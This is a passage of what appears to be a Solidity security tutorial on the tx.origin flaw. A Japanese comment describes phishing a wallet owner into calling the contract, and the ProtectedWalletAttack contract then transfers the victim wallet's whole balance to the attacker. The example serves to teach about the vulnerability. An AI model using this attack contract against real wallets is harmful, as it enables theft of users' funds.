...
/**
Alice -> Wallet.tranfer() (tx.origin = Alice)
Aliceをフィッシングで騙し、以下のように呼び出させる
...
contract ProtectedWalletAttack {
    address payable public owner;
    ProtectedWallet protectedWallet;

    constructor(ProtectedWallet _protectedWallet) {
        protectedWallet = ProtectedWallet(_protectedWallet);
        owner = payable(msg.sender);
    }

    function attack() public {
        protectedWallet.transfer(owner, address(protectedWallet).balance);
    }
}
